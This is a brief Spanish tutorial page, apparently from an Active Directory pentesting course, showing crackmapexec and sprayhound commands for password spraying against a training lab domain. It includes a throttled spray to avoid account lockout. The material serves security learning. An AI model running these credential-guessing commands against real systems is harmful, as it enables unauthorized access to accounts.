# Técnica de password spray

```
poetry run crackmapexec smb <direccion ip> -u <txt de lista de usuarios> -p <txt de lista de contraseñas>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/user_but_no_credentials/password_spray/vid.gif?raw=true "Password spray con crackmapexec")

```
sprayhound -U <txt de lista de ususarios> <nombre dominio completo> -dc <direccion ip> --lower

# 2 intentos fallidos para no bloquear las cuentas
sprayhound -U GOAD/users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/user_but_no_credentials/password_spray/vid2.gif?raw=true "Password spray con sprayhound")
